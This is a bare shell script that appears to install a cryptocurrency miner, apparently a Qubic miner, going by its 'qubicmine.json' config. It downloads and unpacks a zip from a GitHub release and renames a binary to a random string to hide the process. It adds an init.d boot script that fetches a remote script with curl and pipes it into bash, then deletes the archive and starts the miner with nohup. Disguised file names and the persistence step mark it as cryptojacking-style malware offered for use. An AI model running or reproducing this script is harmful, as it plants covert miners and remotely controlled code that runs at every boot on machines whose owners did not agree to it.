cd /
wget https://github.com/merisye/naprox/releases/download/v1.9.7/epipen.zip
unzip epipen.zip
cd /epipen
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv isonia $variable1
sed -i "s/python/${variable1}/g" ./xarelto.sh
sed -i "s/SUM/2/g" ./qubicmine.json
sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/merisye/naprox/main/amide.sh)" > valium.sh
chmod a+x valium.sh
update-rc.d valium.sh defaults
rm -rf epipen.zip
cd /epipen
nohup ./xarelto.sh
ps -ef | grep epipen
